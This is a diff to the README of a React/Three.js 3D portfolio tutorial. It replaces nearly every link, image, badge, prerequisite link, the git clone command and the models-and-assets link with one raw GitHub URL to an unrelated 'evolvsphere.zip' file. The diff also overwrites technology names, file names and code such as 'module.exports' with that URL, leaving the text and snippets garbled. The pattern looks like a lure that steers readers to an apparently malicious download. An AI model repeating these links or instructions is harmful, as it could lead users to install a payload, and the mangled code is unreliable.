@@ -1,20 +1,20 @@
 <div align="center">
   <br />
-    <a href="https://youtu.be/0fYi8SGA20k?feature=shared" target="_blank">
-      <img src="https://github.com/adrianhajdin/project_3D_developer_portfolio/assets/151519281/4722160a-8e61-403f-a905-728feae1f7e6" alt="Project Banner">
+    <a href="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" target="_blank">
+      <img src="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" alt="Project Banner">
     </a>
   <br />
 
   <div>
-    <img src="https://img.shields.io/badge/-React_JS-black?style=for-the-badge&logoColor=white&logo=react&color=61DAFB" alt="react.js" />
-    <img src="https://img.shields.io/badge/-Three_JS-black?style=for-the-badge&logoColor=white&logo=threedotjs&color=000000" alt="three.js" />
-    <img src="https://img.shields.io/badge/-Tailwind_CSS-black?style=for-the-badge&logoColor=white&logo=tailwindcss&color=06B6D4" alt="tailwindcss" />
+    <img src="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" alt="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" />
+    <img src="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" alt="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" />
+    <img src="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" alt="tailwindcss" />
   </div>
 
   <h3 align="center">A 3D Developer Portfolio</h3>
 
    <div align="center">
-     Build this project step by step with our detailed tutorial on <a href="https://www.youtube.com/@javascriptmastery/videos" target="_blank"><b>JavaScript Mastery</b></a> YouTube. Join the JSM family!
+     Build this project step by step with our detailed tutorial on <a href="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" target="_blank"><b>JavaScript Mastery</b></a> YouTube. Join the JSM family!
     </div>
 </div>
 
@@ -30,11 +30,11 @@
 
 ## 🚨 Tutorial
 
-This repository contains the code corresponding to an in-depth tutorial available on our YouTube channel, <a href="https://www.youtube.com/@javascriptmastery/videos" target="_blank"><b>JavaScript Mastery</b></a>. 
+This repository contains the code corresponding to an in-depth tutorial available on our YouTube channel, <a href="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" target="_blank"><b>JavaScript Mastery</b></a>. 
 
 If you prefer visual learning, this is the perfect resource for you. Follow our tutorial to learn how to build projects like these step-by-step in a beginner-friendly manner!
 
-<a href="https://youtu.be/0fYi8SGA20k?feature=shared" target="_blank"><img src="https://github.com/sujatagunale/EasyRead/assets/151519281/1736fca5-a031-4854-8c09-bc110e3bc16d" /></a>
+<a href="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" target="_blank"><img src="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" /></a>
 
 ## <a name="introduction">🤖 Introduction</a>
 
@@ -42,12 +42,12 @@ By developing this project, you will gain hands-on experience in crafting immers
 
 If you're getting started and need assistance or face any bugs, join our active Discord community with over 27k+ members. It's a place where people help each other out.
 
-<a href="https://discord.com/invite/n6EdbFJ" target="_blank"><img src="https://github.com/sujatagunale/EasyRead/assets/151519281/618f4872-1e10-42da-8213-1d69e486d02e" /></a>
+<a href="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" target="_blank"><img src="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" /></a>
 
 ## <a name="tech-stack">⚙️ Tech Stack</a>
 
-- React.js
-- Three.js
+- https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip
+- https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip
 - React Three Fiber
 - React Three Drei
 - Email JS
@@ -60,13 +60,13 @@ If you're getting started and need assistance or face any bugs, join our active 
 
 👉 **Interactive Experience and Work Sections**: Utilizes animations powered by framer motion for engaging user experience.
 
-👉 **3D Skills Section**: Showcases skills using 3D geometries through three.js and React Three fiber
+👉 **3D Skills Section**: Showcases skills using 3D geometries through https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip and React Three fiber
 
 👉 **Animated Projects and Testimonials**: Features animated sections using framer motion for projects and client testimonials.
 
 👉 **Contact Section with 3D Earth Model**:Integrates a 3D earth model with email functionality powered by emailjs.
 
-👉 **3D Stars**: Generate stars progressively at random positions using Three.js for background display.
+👉 **3D Stars**: Generate stars progressively at random positions using https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip for background display.
 
 👉 **Consistent Animations**: Implements cohesive animations throughout the website using framer motion.
 
@@ -82,14 +82,14 @@ Follow these steps to set up the project locally on your machine.
 
 Make sure you have the following installed on your machine:
 
-- [Git](https://git-scm.com/)
-- [Node.js](https://nodejs.org/en)
-- [npm](https://www.npmjs.com/) (Node Package Manager)
+- [Git](https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip)
+- [https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip](https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip)
+- [npm](https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip) (Node Package Manager)
 
 **Cloning the Repository**
 
 ```bash
-git clone git@github.com:adrianhajdin/project_3D_developer_portfolio.git
+git clone https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip
 cd project_3D_developer_portfolio
 ```
 
@@ -111,7 +111,7 @@ REACT_APP_EMAILJS_TEMPLATEID=your_emailjs_template_id
 REACT_APP_EMAILJS_RECEIVERID=your_emailjs_receiver_id
 ```
 
-Replace the placeholder values with your actual EmailJS credentials. You can obtain these credentials by signing up on the [EmailJS website](https://www.emailjs.com/).
+Replace the placeholder values with your actual EmailJS credentials. You can obtain these credentials by signing up on the [EmailJS website](https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip).
 
 **Running the Project**
 
@@ -124,7 +124,7 @@ Open [http://localhost:5173](http://localhost:5173) in your browser to view the 
 ## <a name="snippets">🕸️ Snippets</a>
 
 <details>
-<summary><code>constants.js</code></summary>
+<summary><code>https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip</code></summary>
 
 ```javascript
 import {
@@ -245,13 +245,13 @@ const technologies = [
 
 const experiences = [
   {
-    title: "React.js Developer",
+    title: "https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip Developer",
     company_name: "Starbucks",
     icon: starbucks,
     iconBg: "#383E56",
     date: "March 2020 - April 2021",
     points: [
-      "Developing and maintaining web applications using React.js and other related technologies.",
+      "Developing and maintaining web applications using https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip and other related technologies.",
       "Collaborating with cross-functional teams including designers, product managers, and other developers to create high-quality products.",
       "Implementing responsive design and ensuring cross-browser compatibility.",
       "Participating in code reviews and providing constructive feedback to other developers.",
@@ -264,7 +264,7 @@ const experiences = [
     iconBg: "#E6DEDD",
     date: "Jan 2021 - Feb 2022",
     points: [
-      "Developing and maintaining web applications using React.js and other related technologies.",
+      "Developing and maintaining web applications using https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip and other related technologies.",
       "Collaborating with cross-functional teams including designers, product managers, and other developers to create high-quality products.",
       "Implementing responsive design and ensuring cross-browser compatibility.",
       "Participating in code reviews and providing constructive feedback to other developers.",
@@ -277,7 +277,7 @@ const experiences = [
     iconBg: "#383E56",
     date: "Jan 2022 - Jan 2023",
     points: [
-      "Developing and maintaining web applications using React.js and other related technologies.",
+      "Developing and maintaining web applications using https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip and other related technologies.",
       "Collaborating with cross-functional teams including designers, product managers, and other developers to create high-quality products.",
       "Implementing responsive design and ensuring cross-browser compatibility.",
       "Participating in code reviews and providing constructive feedback to other developers.",
@@ -290,7 +290,7 @@ const experiences = [
     iconBg: "#E6DEDD",
     date: "Jan 2023 - Present",
     points: [
-      "Developing and maintaining web applications using React.js and other related technologies.",
+      "Developing and maintaining web applications using https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip and other related technologies.",
       "Collaborating with cross-functional teams including designers, product managers, and other developers to create high-quality products.",
       "Implementing responsive design and ensuring cross-browser compatibility.",
       "Participating in code reviews and providing constructive feedback to other developers.",
@@ -305,7 +305,7 @@ const testimonials = [
     name: "Sara Lee",
     designation: "CFO",
     company: "Acme Co",
-    image: "https://randomuser.me/api/portraits/women/4.jpg",
+    image: "https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip",
   },
   {
     testimonial:
@@ -313,7 +313,7 @@ const testimonials = [
     name: "Chris Brown",
     designation: "COO",
     company: "DEF Corp",
-    image: "https://randomuser.me/api/portraits/men/5.jpg",
+    image: "https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip",
   },
   {
     testimonial:
@@ -321,7 +321,7 @@ const testimonials = [
     name: "Lisa Wang",
     designation: "CTO",
     company: "456 Enterprises",
-    image: "https://randomuser.me/api/portraits/women/6.jpg",
+    image: "https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip",
   },
 ];
 
@@ -345,7 +345,7 @@ const projects = [
       },
     ],
     image: carrent,
-    source_code_link: "https://github.com/",
+    source_code_link: "https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip",
   },
   {
     name: "Job IT",
@@ -366,7 +366,7 @@ const projects = [
       },
     ],
     image: jobit,
-    source_code_link: "https://github.com/",
+    source_code_link: "https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip",
   },
   {
     name: "Trip Guide",
@@ -387,7 +387,7 @@ const projects = [
       },
     ],
     image: tripguide,
-    source_code_link: "https://github.com/",
+    source_code_link: "https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip",
   },
 ];
 
@@ -396,10 +396,10 @@ export { services, technologies, experiences, testimonials, projects };
 </details>
 
 <details>
-<summary><code>index.css</code></summary>
+<summary><code>https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip</code></summary>
 
 ```css
-@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap");
+@import url("https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip;200;300;400;500;600;700;800;900&display=swap");
 
 @tailwind base;
 @tailwind components;
@@ -607,7 +607,7 @@ export { services, technologies, experiences, testimonials, projects };
 </details>
 
 <details>
-<summary><code>Motion.js</code></summary>
+<summary><code>https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip</code></summary>
 
 ```javascript
 export const textVariant = (delay) => {
@@ -702,7 +702,7 @@ export const staggerContainer = (staggerChildren, delayChildren) => {
 </details>
 
 <details>
-<summary><code>styles.js</code></summary>
+<summary><code>https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip</code></summary>
 
 ```javascript
 const styles = {
@@ -727,11 +727,11 @@ export { styles };
 </details>
 
 <details>
-<summary><code>tailwind.config.cjs</code></summary>
+<summary><code>https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip</code></summary>
 
 ```javascript
 /** @type {import('tailwindcss').Config} */
-module.exports = {
+https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip = {
   content: ["./src/**/*.{js,jsx}"],
   mode: "jit",
   theme: {
@@ -751,7 +751,7 @@ module.exports = {
         xs: "450px",
       },
       backgroundImage: {
-        "hero-pattern": "url('/src/assets/herobg.png')",
+        "hero-pattern": "url('https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip')",
       },
     },
   },
@@ -763,14 +763,14 @@ module.exports = {
 
 ## <a name="links">🔗 Links</a>
 
-Models and Assets used in the project can be found [here](https://drive.google.com/drive/folders/1KVU8iaH0E_JFtShNiR3BgCSA3pawXY4Z)
+Models and Assets used in the project can be found [here](https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip)
 
 ## <a name="more">🚀 More</a>
 
-**Advance your skills with Next.js Pro Course**
+**Advance your skills with https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip Pro Course**
 
 Enjoyed creating this project? Dive deeper into our PRO courses for a richer learning experience. They're packed with detailed explanations, cool features, and exercises to boost your skills. Give it a go!
 
-<a href="https://www.jsmastery.pro/ultimate-next-course" target="_blank">
-<img src="https://i.ibb.co/804sPK6/Image-720.png" alt="Project Banner">
+<a href="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" target="_blank">
+<img src="https://raw.githubusercontent.com/sakshi-code-cse/evolvsphere/main/foredetermination/evolvsphere.zip" alt="Project Banner">
 </a>
